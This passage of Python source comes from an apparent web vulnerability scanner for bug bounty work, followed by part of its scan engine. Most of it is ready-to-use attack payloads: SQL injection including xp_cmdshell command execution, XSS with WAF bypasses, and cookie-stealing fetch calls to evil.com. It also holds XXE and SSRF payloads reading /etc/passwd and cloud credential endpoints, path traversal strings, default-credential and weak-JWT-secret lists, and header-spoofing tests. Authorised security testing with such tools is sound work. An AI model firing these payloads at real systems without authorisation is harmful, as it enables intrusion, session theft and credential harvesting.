    "invalid query", "jdbc", "sqlstate", "db2 sql error",
    "sybase message", "dynamic sql error", "data type mismatch",
]

# ── SQLi Payloads ── Error + Boolean + Time + Union ─────────────
SQLI_PAYLOADS_ERROR = [
    # MSSQL time-based blind
    "' WAITFOR DELAY '0:0:3'--",
    "1; WAITFOR DELAY '0:0:3'--",
    "'); WAITFOR DELAY '0:0:3'--",
    # Classic error-based
    "'", "''", "`", "''`", "')", "')--", "')/*",
    "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "' OR 1=1/*",
    "\" OR \"1\"=\"1", "\" OR 1=1--",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    # WAF bypass
    "' oR '1'='1", "' OR/*comment*/'1'='1",
    "' UNION/**/SELECT/**/NULL--", "' UNION%20SELECT%20NULL--",
    "%27 OR %271%27=%271", "'/**/OR/**/'1'='1",
    "' OR 0x313d31--", "' OR char(49)=char(49)--",
    # MSSQL specific
    "' AND 1=CONVERT(int,@@version)--",
    "'; EXEC xp_cmdshell('whoami')--",
    # Oracle specific
    "' UNION SELECT NULL FROM DUAL--",
    "' UNION SELECT username,password FROM dba_users--",
    # MySQL specific
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    # PostgreSQL
    "'; SELECT pg_sleep(3)--",
    # Second order
    "admin'--", "admin'/*",
    # Advanced
    "') OR ('1'='1", "')) OR (('1'='1",
    "' OR 1=1 LIMIT 1--", "' or 1=1#", "' or ''='",
]

# Boolean-blind pairs — (true_payload, false_payload)
SQLI_BOOLEAN_PAIRS = [
    ("' AND 1=1--",           "' AND 1=2--"),
    ("' AND 'x'='x'--",       "' AND 'x'='y'--"),
    ("1 AND 1=1--",            "1 AND 1=2--"),
    ("' OR 1=1--",             "' OR 1=2--"),
    ("1' AND '1'='1",          "1' AND '1'='2"),
    ("\" AND \"1\"=\"1\"--",   "\" AND \"1\"=\"2\"--"),
    ("' AND 1=1#",             "' AND 1=2#"),
    ("' AND TRUE--",           "' AND FALSE--"),
    ("1 AND TRUE",             "1 AND FALSE"),
    # MSSQL boolean
    ("' AND 1=1 WAITFOR DELAY '0:0:0'--", "' AND 1=2 WAITFOR DELAY '0:0:0'--"),
]

# Time-based blind — (payload, delay_seconds, db_type)
# Time-based SQLi payloads — kept minimal intentionally.
# With baseline+confirmation requirement, each test = 5 requests (3 baseline + 2 payload).
# This makes time-based testing inherently slow; fewer payloads = faster + fewer FPs.
# Only the most reliable per DB type. SLEEP() works on MySQL/MariaDB/SQLite3.
SQLI_TIME_PAYLOADS = [
    ("' AND SLEEP(3)--",                     3, "MySQL"),
    ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", 3, "MySQL-nested"),
    ("'; WAITFOR DELAY '0:0:3'--",           3, "MSSQL"),
    ("'; SELECT pg_sleep(3)--",              3, "PostgreSQL"),
]

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert(document.cookie)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg onload="alert(document.cookie)">',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '" onmouseover="alert(1)"',
    "' onmouseover='alert(1)'",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<ScRiPt>alert(1)</ScRiPt>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<script>/*comment*/alert(1)</script>',
    '<img\tsrc=x\tonerror=alert(1)>',
    '<img\nsrc=x\nonerror=alert(1)>',
    '"};</script><script>alert(1)</script>',
    '\'"()&%<acx><ScRiPt >alert(1)</ScRiPt>',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<audio src=x onerror=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<marquee onstart=alert(1)>',
    # Stored XSS probes (fetch-based — survives page reload)
    '<script>fetch("https://evil.com/?c="+document.cookie)</script>',
    '<img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)">',
    # Polyglot
    '\'"()&%<acx><ScRiPt >alert(1)</ScRiPt>',
]

# ══════════════════════════════════════════════════════════════
# ROUND 2 PAYLOAD LIBRARIES
# ══════════════════════════════════════════════════════════════

# ── WAF Bypass XSS Payloads ─────────────────────────────────
# Organized by bypass technique — used when standard payloads blocked
XSS_WAF_BYPASS = [
    # ── HTML entity encoding ──
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    # ── Unicode escape ──
    '\u003cscript\u003ealert(1)\u003c/script\u003e',
    '\x3cscript\x3ealert(1)\x3c/script\x3e',
    # ── Double URL encode ──
    '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
    '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
    # ── Null byte injection ──
    '<scr\x00ipt>alert(1)</scr\x00ipt>',
    '<scr%00ipt>alert(1)</scr%00ipt>',
    # ── Comment obfuscation ──
    '<script>ale/**/rt(1)</script>',
    '<script>a\u006cert(1)</script>',
    '<!--<script>alert(1)</script>-->',
    '<script>alert`1`</script>',
    # ── Tag mutation ──
    '<Script>alert(1)</Script>',
    '<SCRIPT/SRC>alert(1)</SCRIPT>',
    '<img/src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    # ── Event handler variations ──
    '<img src=x onerror="&#97;lert(1)">',
    '<img src=x onerror="\u0061lert(1)">',
    '<a href="javascript&#58;alert(1)">click</a>',
    '<a href="java\tscript:alert(1)">click</a>',
    '<a href="java\nscript:alert(1)">click</a>',
    # ── CSS injection ──
    '<style>@import"javascript:alert(1)"</style>',
    '<div style="background:url(javascript:alert(1))">',
    # ── Template literal bypass ──
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    # ── Cloudflare specific bypass ──
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set attributeName=onmouseover value=alert(1)>',
    '<details/open/ontoggle="alert`1`">',
    # ── Akamai bypass ──
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    # ── Prototype pollution via XSS ──
    '"><img src=x onerror=alert(document.domain)>',
    '"><svg onload=alert(document.cookie)>',
]

# ── Context-Aware XSS — payload sets per injection context ──
# Detected by scanning baseline response for where param value lands
XSS_CONTEXT_PAYLOADS = {
    # Input lands inside <tag attribute="HERE">
    "attr_double": [
        '" onmouseover="alert(1)" x="',
        '" onfocus="alert(1)" autofocus x="',
        '" onload="alert(1)" x="',
        '" onclick="alert(1)" x="',
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '" style="animation-name:x" onanimationstart="alert(1)',
    ],
    # Input lands inside <tag attribute='HERE'>
    "attr_single": [
        "' onmouseover='alert(1)' x='",
        "' onfocus='alert(1)' autofocus x='",
        "' onclick='alert(1)' x='",
        "'><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
    ],
    # Input lands inside <script>var x = "HERE";</script>
    "js_string_double": [
        '";alert(1)//',
        '"-alert(1)-"',
        '\\";alert(1)//',
        '"+(alert(1))+"',
        '";alert(document.cookie)//',
    ],
    # Input lands inside <script>var x = 'HERE';</script>
    "js_string_single": [
        "';alert(1)//",
        "'-alert(1)-'",
        "\\';alert(1)//",
        "'+(alert(1))+'",
    ],
    # Input used in href/src/action="HERE"
    "url_context": [
        "javascript:alert(1)",
        "javascript:alert(document.cookie)",
        "JaVaScRiPt:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:alert(1)",
    ],
    # Input directly in HTML body <div>HERE</div>
    "html_body": [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<math><mtext></math><img src=x onerror=alert(1)>',
    ],
}

# Hidden param high-value list and evidence keywords are defined
# inside test_hidden_params() for precision targeting

# ── Header Injection Payloads ────────────────────────────────
# Real bug bounty findings — bypasses IP restrictions,
# accesses admin panels, causes cache poisoning
HEADER_INJECTION_TESTS = [
    # Host header injection — cache poisoning, password reset poisoning
    {"header": "Host", "values": ["evil.com", "attacker.com", "localhost", "127.0.0.1"]},
    # IP spoofing — bypass IP-based auth
    {"header": "X-Forwarded-For", "values": ["127.0.0.1", "0.0.0.0", "::1", "localhost", "10.0.0.1"]},
    {"header": "X-Real-IP", "values": ["127.0.0.1", "0.0.0.0", "::1"]},
    {"header": "X-Client-IP", "values": ["127.0.0.1", "::1"]},
    {"header": "X-Remote-IP", "values": ["127.0.0.1"]},
    {"header": "X-Remote-Addr", "values": ["127.0.0.1"]},
    {"header": "True-Client-IP", "values": ["127.0.0.1"]},
    {"header": "CF-Connecting-IP", "values": ["127.0.0.1"]},
    # URL override — access internal paths
    {"header": "X-Original-URL", "values": ["/admin", "/internal", "/.env", "/debug"]},
    {"header": "X-Rewrite-URL", "values": ["/admin", "/internal", "/.env"]},
    {"header": "X-Override-URL", "values": ["/admin", "/.env"]},
    # Cache poisoning via header
    {"header": "X-Forwarded-Host", "values": ["evil.com", "attacker.com"]},
    {"header": "X-Forwarded-Proto", "values": ["http", "https"]},
    # CORS bypass
    {"header": "Origin", "values": ["null", "https://evil.com", "http://localhost"]},
]

# ══════════════════════════════════════════════════════════════
# ROUND 3 PAYLOAD LIBRARIES
# ══════════════════════════════════════════════════════════════

# ── JWT Testing ─────────────────────────────────────────────
# Known weak HS256 secrets used in real-world breaches
JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "qwerty", "test", "changeme",
    "mysecret", "jwt_secret", "jwt-secret", "supersecret",
    "your-256-bit-secret", "your-secret-key", "key", "private",
    "HS256", "HMACSHA256", "secret123", "app_secret", "django-insecure",
    "development", "dev", "prod", "production", "staging",
    "flask-secret", "rails-secret", "laravel-secret",
    "abcdefghijklmnopqrstuvwxyz", "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "0123456789", "password123", "admin123", "letmein", "welcome",
]

# ── GraphQL ──────────────────────────────────────────────────
GRAPHQL_INTROSPECTION_QUERY = '{"query":"{__schema{types{name}}}"}'
GRAPHQL_PATHS = [
    "/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
    "/query", "/gql", "/graph", "/api/graph",
]
GRAPHQL_INJECTION_PAYLOADS = [
    # Syntax breaking
    '{"query":"{user(id:\\"1 OR 1=1\\"){id name email}}"}',
    '{"query":"{user(id:1){id name email password}}"}',
    # Field enumeration
    '{"query":"{__type(name:\\"User\\"){fields{name type{name}}}}"}',
    # Batch / alias DoS probe
    '{"query":"{ a:__typename b:__typename c:__typename }"}',
    # Directive injection
    '{"query":"query{__typename @skip(if:false)}"}',
]

# ── XXE Injection ────────────────────────────────────────────
XXE_PAYLOADS = [
    # Classic Linux read
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
     ["root:x:", "root:!:", "daemon:x:", "/bin/bash"]),
    # Windows
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><root>&xxe;</root>',
     ["[fonts]", "[extensions]", "for 16-bit"]),
    # SSRF via XXE
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
     ["ami-id", "instance-id", "public-ipv4"]),
    # Parameter entity (sometimes bypasses filters)
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root/>',
     ["root:x:", "daemon:"]),
    # Billion laughs DoS probe (safe/limited version)
    ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><root>&lol2;</root>',
     []),  # detect via timing, not content
    # PHP filter read
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>',
     ["PD9waHA", "<?php"]),
]
XXE_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/xhtml+xml",
    "application/soap+xml",
]

# ── Subdomain Takeover ───────────────────────────────────────
# Fingerprints: (service_name, cname_suffix, body_fingerprint)
SUBDOMAIN_TAKEOVER_FINGERPRINTS = [
    ("GitHub Pages",       "github.io",           ["There isn't a GitHub Pages site here", "github.com/404"]),
    ("Heroku",             "herokudns.com",        ["No such app", "herokucdn.com/error-pages/no-such-app"]),
    ("Heroku",             "herokuapp.com",        ["No such app"]),
    ("Netlify",            "netlify.app",          ["Not Found - Request ID"]),
    ("Netlify",            "netlify.com",          ["Not Found - Request ID"]),
    ("AWS S3",             "s3.amazonaws.com",     ["NoSuchBucket", "The specified bucket does not exist"]),
    ("AWS CloudFront",     "cloudfront.net",       ["ERROR: The request could not be satisfied"]),
    ("Azure",              "azurewebsites.net",    ["Web App - Unavailable", "404 Web Site not found"]),
    ("Azure",              "cloudapp.azure.com",   ["404 Web Site not found"]),
    ("Ghost",              "ghost.io",             ["The thing you were looking for is no longer here"]),
    ("Shopify",            "myshopify.com",        ["Sorry, this shop is currently unavailable", "only works with Shopify"]),
    ("Fastly",             "fastly.net",           ["Fastly error: unknown domain"]),
    ("Pantheon",           "pantheonsite.io",      ["404 error unknown site"]),
    ("Tumblr",             "tumblr.com",           ["Whatever you were looking for doesn't live here"]),
    ("WPEngine",           "wpengine.com",         ["The site you were looking for couldn't be found"]),
    ("Zendesk",            "zendesk.com",          ["Help Center Closed"]),
    ("Unbounce",           "unbouncepages.com",    ["The requested URL was not found on this server"]),
    ("Desk",               "desk.com",             ["Sorry, We Couldn't Find That Page"]),
    ("Pingdom",            "stats.pingdom.com",    ["This public report page has not been activated"]),
    ("Surge",              "surge.sh",             ["project not found"]),
    ("Readme",             "readme.io",            ["Project doesnt exist... yet!"]),
    ("Fly.io",             "fly.dev",              ["404 - Not Found"]),
    ("Render",             "onrender.com",         ["not found on Render", "does not exist on Render"]),
    ("DigitalOcean App",   "ondigitalocean.app",   ["Domain Not Found"]),
    ("LaunchRock",         "launchrock.com",       ["It looks like you may have taken a wrong turn"]),
    ("UserVoice",          "uservoice.com",        ["This UserVoice subdomain is currently available"]),
    ("Intercom",           "custom.intercom.help", ["This page is reserved for artistic content"]),
    ("Webflow",            "webflow.io",           ["The page you are looking for doesn't exist"]),
]

# ── CORS Testing ─────────────────────────────────────────────
CORS_TEST_ORIGINS = [
    "https://evil.com",
    "null",
    "https://trusted.evil.com",   # prefix bypass
    "https://evil.trusted.com",   # suffix bypass (filled in dynamically)
    "http://localhost",
    "https://127.0.0.1",
    "https://sub.{domain}",       # subdomain (filled in dynamically)
    "https://{domain}.evil.com",  # postfix (filled in dynamically)
]

# ── Common API Paths to probe ────────────────────────────────
COMMON_API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/api/users", "/api/user", "/api/admin",
    "/api/auth", "/api/login", "/api/token",
    "/api/config", "/api/settings", "/api/debug",
    "/v1", "/v2", "/v3",
    "/graphql", "/graphiql",
    "/rest", "/rest/v1", "/rest/v2",
    "/swagger", "/swagger-ui", "/swagger.json",
    "/openapi.json", "/openapi.yaml",
    "/health", "/healthz", "/ping", "/status",
    "/metrics", "/actuator", "/actuator/env",
    "/_api", "/_internal",
]

# ── SSTI Payloads — MATH EVALUATION ONLY (no reflection-based)
# Each payload uses a unique random-looking multiplication so result
# cannot appear by coincidence in a normal response.
# Rule: result must be EXACT math output — not a string that could
# appear anywhere in a reflected response.
# Format: (payload_template, result_template, engine)
# {N} is replaced at runtime with a random integer so canary is unique.
SSTI_PAYLOAD_TEMPLATES = [
    # Jinja2 / Twig
    ("{{{{SSTI_A*SSTI_B}}}}",         None,  "Jinja2/Twig"),
    ("{{{{SSTI_A*SSTI_B}}}}",         None,  "Jinja2/Twig"),
    # Jinja2 advanced — string repeat (7*'7' = '7777777')
    ("{{{{'SSTI_X'*SSTI_A}}}}",       None,  "Jinja2"),
    # FreeMarker / Spring / Groovy
    ("${{SSTI_A*SSTI_B}}",            None,  "FreeMarker/Spring"),
    # ERB / EJS
    ("<%= SSTI_A*SSTI_B %>",          None,  "ERB/EJS"),
    # Spring SpEL
    ("*{{SSTI_A*SSTI_B}}",            None,  "Spring SpEL"),
    # Smarty
    ("{{math equation='SSTI_A*SSTI_B' format='%d'}}", None, "Smarty"),
    # Pebble / Ruby
    ("#{{SSTI_A*SSTI_B}}",            None,  "Pebble/Ruby"),
]

# CMDI payloads are defined inline inside test_cmdi() for smart targeting

# LFI_PAYLOADS — 20 highest-signal payloads for bug bounty.
# Original 51-payload list generated 38k+ combinations on API-heavy targets
# (13+ minutes, burning the entire rate budget on one module).
# These 20 cover: Linux traversal (all depths), Windows, encoding
# bypasses, PHP wrappers, and absolute paths.
# Real LFI almost always hits within the first 5-8 payloads anyway.
LFI_PAYLOADS = [
    # Linux path traversal — depth 1-6
    '../etc/passwd',
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    # Windows path traversal
    '../windows/win.ini',
    '../../windows/win.ini',
    '../../../windows/win.ini',
    '../../../../windows/win.ini',
    # Encoding bypasses (WAF evasion)
    '..%2fetc%2fpasswd',
    '..%2f..%2fetc%2fpasswd',
    '%2e%2e%2fetc%2fpasswd',
    '....//etc/passwd',
    '..%c0%afetc%c0%afpasswd',
    # PHP wrappers
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/read=convert.base64-encode/resource=config.php',
    # Absolute paths
    '/etc/passwd',
    '/proc/self/environ',
    'C:/windows/win.ini',
]

OPEN_REDIRECT_PAYLOADS = [
    'https://evil.com', 'http://evil.com', '//evil.com', '///evil.com',
    'https:evil.com', 'HtTpS://evil.com',
    'https%3A%2F%2Fevil.com', '%2F%2Fevil.com',
    '//evil.com/%2F..', '/\\evil.com', '//\\evil.com',
    'https://trusted.com@evil.com', 'https://evil.com@trusted.com',
    '%252F%252Fevil.com', 'https%253A%252F%252Fevil.com',
    'https://evil.com%0d%0aLocation:https://evil.com',
]

REDIRECT_PARAMS = [
    'url', 'redirect', 'redirect_uri', 'redirect_url', 'next',
    'goto', 'return', 'returnUrl', 'return_url', 'returnTo',
    'callback', 'continue', 'destination', 'dest', 'target',
    'redir', 'ref', 'link', 'forward', 'location', 'jump',
]

SSRF_PAYLOADS = [
    'http://127.0.0.1', 'http://localhost', 'http://0.0.0.0',
    'http://[::1]', 'http://127.0.0.1:80', 'http://127.0.0.1:8080',
    'http://127.0.0.1:443', 'http://127.0.0.1:22',
    'http://127.0.0.1:3306', 'http://127.0.0.1:6379',
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://0x7f000001', 'http://2130706433',
    'file:///etc/passwd', 'file:///windows/win.ini',
    'http://192.168.0.1', 'http://10.0.0.1',
]

SSRF_SIGNATURES = [
    "ami-id", "instance-id", "local-hostname", "iam/security-credentials",
    "computeMetadata", "serviceAccounts", "MSI_ENDPOINT",
    "root:x:0:0", "root:!:0:0", "[boot loader]",
    '"ip_address":', '"mac":', '"vpc-id":',
    "169.254.169.254", "metadata.google.internal",
]

SSRF_PARAMS = [
    'url', 'path', 'src', 'source', 'dest', 'destination',
    'redirect', 'uri', 'link', 'fetch', 'load', 'file',
    'page', 'site', 'api', 'proxy', 'host', 'endpoint',
    'webhook', 'callback', 'feed', 'import', 'connect',
    'service', 'ip', 'domain', 'server', 'resource',
]

# Top 50 default credentials for real-world auth testing
DEFAULT_CREDENTIALS = [
    ("admin",          "admin"),
    ("admin",          "password"),
    ("admin",          "123456"),
    ("admin",          "admin123"),
    ("admin",          "password123"),
    ("admin",          "1234"),
    ("admin",          "12345"),
    ("admin",          "pass"),
    ("admin",          "letmein"),
    ("admin",          "qwerty"),
    ("root",           "root"),
    ("root",           "toor"),
    ("root",           "password"),
    ("root",           "123456"),
    ("root",           "admin"),
    ("test",           "test"),
    ("test",           "password"),
    ("user",           "user"),
    ("user",           "password"),
    ("user",           "123456"),
    ("guest",          "guest"),
    ("guest",          "password"),
    ("administrator",  "administrator"),
    ("administrator",  "password"),
    ("administrator",  "admin"),
    ("demo",           "demo"),
    ("demo",           "password"),
    ("postgres",       "postgres"),
    ("postgres",       "password"),
    ("mysql",          "mysql"),
    ("oracle",         "oracle"),
    ("sa",             "sa"),
    ("sa",             ""),
    ("sa",             "password"),
    ("tomcat",         "tomcat"),
    ("tomcat",         "s3cret"),
    ("manager",        "manager"),
    ("jenkins",        "jenkins"),
    ("pi",             "raspberry"),
    ("ubuntu",         "ubuntu"),
    ("ec2-user",       "ec2-user"),
    ("vagrant",        "vagrant"),
    ("ansible",        "ansible"),
    ("deploy",         "deploy"),
    ("devops",         "devops"),
    ("ftp",            "ftp"),
    ("anonymous",      "anonymous"),
    ("anonymous",      ""),
    ("web",            "web"),
    ("support",        "support"),
]


# ═══════════════════════════════════════════════════════════════
# MAIN SCAN ENGINE
# ═══════════════════════════════════════════════════════════════
def run_scan(target, mode="active", scope="", auth_config=None):
    reset_state(mode, target=target)
    headers = get_headers()
    auth_config = auth_config or {}

    if mode == "passive":
        max_pages, run_active = 30, False
    elif mode == "deep":
        max_pages, run_active = 500, True
    else:
        max_pages, run_active = 100, True

    try:
        # ── RECON ─────────────────────────────────────────
        scan_state["step"] = "RECON"
        scan_state["progress"] = 3
        log(f"Starting {mode.upper()} scan on {target}")
        log(f"Max pages: {max_pages}")
        log(f"Rate limit: {rate_limiter.max_rps} req/sec (true global — all threads combined)")
        log(f"Scope: LOCKED to {urlparse(target).netloc} — all out-of-scope requests blocked", "success")

        # ── AUTHENTICATION ─────────────────────────────────
        auth_headers = {}

        # Option 1: Manual token pasted directly
        manual_token = auth_config.get("auth_token", "").strip()
        if manual_token:
            if manual_token.startswith("eyJ"):
                auth_headers = {
                    "Authorization": f"Bearer {manual_token}",
                    "auth_type": "jwt",
                    "auth_token": manual_token
                }
                log(f"AUTH: Using manually provided JWT token", "success")
            else:
                auth_headers = {
                    "Cookie": manual_token,
                    "auth_type": "cookie",
                    "auth_token": manual_token
                }
                log(f"AUTH: Using manually provided session token", "success")

        # Option 2: Login with credentials
        elif auth_config.get("login_url") and auth_config.get("username"):
            auth_headers = perform_login(
                auth_config["login_url"],
                auth_config["username"],
                auth_config.get("password", ""),
                target
            )

        # Merge auth into base headers for all requests
        if auth_headers:
            headers = apply_auth(headers, auth_headers)
            scan_state["authenticated"] = True
            scan_state["auth_user"] = auth_config.get("username", "token")
            log(f"AUTH: All requests will include authentication ✓", "success")
        else:
            scan_state["authenticated"] = False
            if auth_config.get("login_url"):
                log(f"AUTH: Proceeding unauthenticated", "warn")

        urls, forms, params_map, tech_stack = crawl(target, headers, max_pages)
        params_map = dedup_params(params_map)
        forms      = dedup_forms(forms)

        if tech_stack:
            log(f"Tech stack detected: {', '.join(tech_stack)}", "info")

        log(f"Discovered {len(urls)} URLs, {len(forms)} forms, {len(params_map)} unique param endpoints", "success")

        # ── AUTHENTICATED RE-CRAWL ─────────────────────────
        # If we have auth, crawl again to find endpoints only
        # visible when logged in (profile, settings, admin, etc.)
        if auth_headers:
            log(f"AUTH: Re-crawling as authenticated user to discover protected endpoints...", "info")
            auth_urls, auth_forms, auth_params, _ = crawl(target, headers, max_pages)
            auth_params = dedup_params(auth_params)
            auth_forms_dedup = dedup_forms(auth_forms)

            # Merge new findings — only add URLs not already found
            existing_urls = set(urls)
            new_urls = [u for u in auth_urls if u not in existing_urls]
            if new_urls:
                log(f"AUTH: Found {len(new_urls)} additional authenticated endpoints", "success")
                urls.extend(new_urls)

            # Merge params
            for url, pnames in auth_params.items():
                if url not in params_map:
                    params_map[url] = pnames

            # Merge forms
            existing_actions = {f["action"] for f in forms}
            new_forms = [f for f in auth_forms_dedup if f["action"] not in existing_actions]
            if new_forms:
                log(f"AUTH: Found {len(new_forms)} additional authenticated forms", "success")
                forms.extend(new_forms)

            log(f"AUTH: Total after auth crawl: {len(urls)} URLs, {len(forms)} forms, {len(params_map)} param endpoints", "success")

        # ─────────────────────────────────────────────────────────
        # SMART PARAM INJECTION (Bug Bounty Critical)
        # REST/SPA apps don't embed ?params in crawled URLs.
        # We inject common search/filter/id params onto every
        # discovered API endpoint so SQLi, XSS, redirect modules
        # can test them. This is the #1 gap in most scanners.
        # ─────────────────────────────────────────────────────────
        _parsed_base = urlparse(target)
        _base_origin = f"{_parsed_base.scheme}://{_parsed_base.netloc}"

        SMART_PARAMS = [
            # High-value search/filter params — prime SQLi/XSS surface
            "q", "search", "query", "keyword", "filter", "term",
            "name", "email", "username", "user", "title",
            # ID params — IDOR + SQLi
            "id", "user_id", "order_id", "product_id", "item_id",
            "account_id", "customer_id", "record_id",
            # Redirect params — open redirect
            "redirect", "url", "next", "return", "goto", "dest",
            # Debug / feature params
            "debug", "admin", "format", "output", "callback",
            "lang", "locale", "page", "limit", "offset", "sort",
        ]

        SMART_INJECT_KEYWORDS = [
            "/api/", "/rest/", "/v1/", "/v2/", "/v3/",
            "search", "find", "query", "lookup", "filter",
            "products", "users", "items", "orders", "list",
        ]

        _injected = 0
        for _url in list(urls):
            _p = urlparse(_url)
            _path_lower = _p.path.lower()
            # Only target API/REST endpoints that have no existing params
            if not _p.query and any(kw in _path_lower for kw in SMART_INJECT_KEYWORDS):
                for _param in SMART_PARAMS:
                    _val = "1" if _param.endswith("_id") or _param == "id" else "test"
                    _injected_url = f"{_base_origin}{_p.path}?{_param}={_val}"
                    if _injected_url not in params_map:
                        params_map[_injected_url] = [_param]
                        _injected += 1
        if _injected:
            log(f"SMART INJECT: {_injected} testable param endpoints injected from {len(urls)} URLs", "info")


        scan_state["progress"] = 12

        # ── SECURITY HEADERS ──────────────────────────────
        scan_state["step"] = "SEC HEADERS"
        scan_state["progress"] = 14
        log("Checking HTTP security headers...")
        _safe_module(check_headers, target, headers)
        scan_state["progress"] = 18

        # ── SECRETS (threaded) ────────────────────────────
        scan_state["step"] = "SECRETS"
        scan_state["progress"] = 19
        log("Scanning for exposed secrets and sensitive files...")
        _safe_module(check_secrets, target, urls, headers)
        scan_state["progress"] = 26

        # ── SSL/TLS (silent — no WAF risk) ────────────────
        scan_state["step"] = "SSL/TLS"
        scan_state["progress"] = 27
        log("Checking SSL/TLS configuration...")
        _safe_module(test_ssl, target, headers)
        scan_state["progress"] = 30

        if run_active:
            # ── IDOR (read) ───────────────────────────────
            scan_state["step"] = "IDOR"
            scan_state["progress"] = 32
            log("Testing IDOR vulnerabilities...")
            _safe_module(test_idor, target, urls, headers)
            scan_state["progress"] = 35

            # ── WRITE IDOR (PUT/PATCH/DELETE) ─────────────
            scan_state["step"] = "WRITE IDOR"
            scan_state["progress"] = 35
            log("Testing Write IDOR (unauthorized PUT/PATCH on other users' resources)...")
            # Use all known URLs: crawled + smart-injected (params_map keys contain /api/* paths)
            all_known_urls = list(set(urls) | set(params_map.keys()))
            _safe_module(test_write_idor, target, all_known_urls, headers)
            scan_state["progress"] = 36

            # ── MASS ASSIGNMENT ───────────────────────────
            scan_state["step"] = "MASS ASSIGNMENT"
            scan_state["progress"] = 36
            log("Testing Mass Assignment (privileged field injection)...")
            _safe_module(test_mass_assignment, target, all_known_urls, headers)
            scan_state["progress"] = 37

            # ── BROKEN AUTH ───────────────────────────────
            scan_state["step"] = "BROKEN AUTH"
            scan_state["progress"] = 37
            log("Testing authentication security...")
            _safe_module(test_auth, target, urls, headers)
            scan_state["progress"] = 41

            # ── HEADER INJECTION (before loud modules) ────
            scan_state["step"] = "HEADER INJECTION"
            scan_state["progress"] = 42
            log("Testing header injection (Host, X-Forwarded-For, X-Original-URL)...")
            _safe_module(test_header_injection, target, urls, headers)
            scan_state["progress"] = 45

            # ── OPEN REDIRECT ─────────────────────────────
            scan_state["step"] = "OPEN REDIRECT"
            scan_state["progress"] = 46
            log("Testing Open Redirect...")
            _safe_module(test_open_redirect, target, urls, params_map, headers)
            scan_state["progress"] = 49

            # ── XSS (context-aware + WAF bypass) ──────────
            scan_state["step"] = "XSS"
            scan_state["progress"] = 50
            log(f"Testing XSS (context-aware + WAF bypass)...")
            _safe_module(test_xss, target, urls, forms, params_map, headers)
            scan_state["progress"] = 57

            # ── HIDDEN PARAMETERS ─────────────────────────
            scan_state["step"] = "HIDDEN PARAMS"
            scan_state["progress"] = 58
            log("Testing hidden parameters (15 high-value params, keyword evidence required)...")
            _safe_module(test_hidden_params, target, urls, params_map, headers)
            scan_state["progress"] = 62

            # ── JSON / API TESTING ────────────────────────
            scan_state["step"] = "JSON API"
            scan_state["progress"] = 63
            log("Testing JSON/API endpoints...")
            _safe_module(test_json_api, target, urls, headers)
            scan_state["progress"] = 66

            # ── SSTI ──────────────────────────────────────
            scan_state["step"] = "SSTI"
            scan_state["progress"] = 67
            log("Testing Server-Side Template Injection (SSTI)...")
            _safe_module(test_ssti, target, urls, forms, params_map, headers)
            scan_state["progress"] = 70

            # ── COMMAND INJECTION ─────────────────────────
            scan_state["step"] = "COMMAND INJECTION"
            scan_state["progress"] = 71
            log("Testing Command Injection...")
            _safe_module(test_cmdi, target, urls, forms, params_map, headers)
            scan_state["progress"] = 74

